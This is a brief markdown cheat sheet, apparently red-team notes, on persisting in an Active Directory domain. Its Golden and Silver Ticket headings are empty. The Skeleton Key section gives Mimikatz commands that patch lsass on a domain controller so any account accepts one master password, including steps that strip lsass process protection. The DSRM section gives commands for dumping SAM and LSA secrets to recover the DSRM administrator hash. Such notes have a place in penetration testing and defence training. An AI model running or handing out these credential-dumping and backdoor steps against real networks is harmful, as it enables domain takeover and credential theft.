## Persistence on Active Directory 

### Golden Ticket



### Silver Ticket


### Skeleton Key
```powershell
# Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>

# Now can access any host in the domain with any user with password `mimikatz`
C:> Enter-PSSession -Computername <host> -Credential <domain>\<username>
```
```powershell
# If lsass is running proected, need to use mimikatz driver
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect process:lsass.exe /remove
mimikatz # misc ::skeleton
mimikatz # !

```
### DSRM (Directory Services Restore Mode)
- There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd

1. Dump DSRM password (DA privileges required)
```powershell
C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <hostname>
```

2. Compare the Administrator hash with the Admin hash of this command
```powershell
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <hostname>
```
3. First one is the DSRM local Admin

### MORE





